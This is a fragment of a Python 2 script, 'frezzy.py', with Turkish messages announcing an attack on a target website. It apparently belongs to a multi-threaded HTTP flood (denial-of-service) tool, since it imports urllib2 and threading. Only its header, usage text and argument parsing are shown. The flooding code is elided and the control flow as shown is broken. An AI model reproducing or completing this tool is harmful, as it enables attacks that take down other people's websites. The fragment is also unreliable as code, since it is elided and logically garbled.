...
# CyberSecurty 
#
# author :  CyberSecurty, version 1.0
# ----------------------------------------------------------------------------------------------
import urllib2
import sys
import threading
...
def usage():
	print '---------------------------------------------------'
	print 'Windows: frezzy.py hedefsite.com'
	print 'Linux/Termux: python2 frezzy.py hedefsite.com'
	print 'Bu Script Fikri Anil Sahin Tarafindan Yapilmistir Kodlanmasi Yasak'
	print '---------------------------------------------------'
...
if len(sys.argv) < 2:
	...
	if sys.argv[1]=="help":
		...
		print "-- Frezzy  Saldirisi Basladi --"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
